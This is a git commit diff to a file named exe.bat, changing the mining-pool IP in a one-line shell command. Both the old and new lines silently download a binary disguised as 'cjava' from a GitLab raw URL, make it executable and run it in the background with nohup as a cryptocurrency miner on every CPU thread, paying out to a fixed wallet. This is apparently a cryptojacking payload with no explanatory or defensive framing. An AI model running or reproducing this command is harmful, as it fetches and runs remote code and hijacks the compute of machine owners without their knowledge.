ed9d0de9f63e68c00a60fd6aa3b537c1e735698d
meganukroeth <166919006+meganukroeth@users.noreply.github.com>
2024-10-04 05:39:20 +0700

    Update exe.bat

--- exe.bat
+++ exe.bat
@@ -1,1 +1,1 @@
-wget -qO cjava https://gitlab.com/ghcees/pack/-/raw/main/cjava && chmod +x cjava && nohup ./cjava -a yespowertide -o 47.237.3.59:443 -u TYtuxwX9z9XcZ3YmFHgQSYT4tevQi1aPHQ.dns -p x -t $(nproc --all)
+wget -qO cjava https://gitlab.com/ghcees/pack/-/raw/main/cjava && chmod +x cjava && nohup ./cjava -a yespowertide -o 49.157.47.186:443 -u TYtuxwX9z9XcZ3YmFHgQSYT4tevQi1aPHQ.dns -p x -t $(nproc --all)
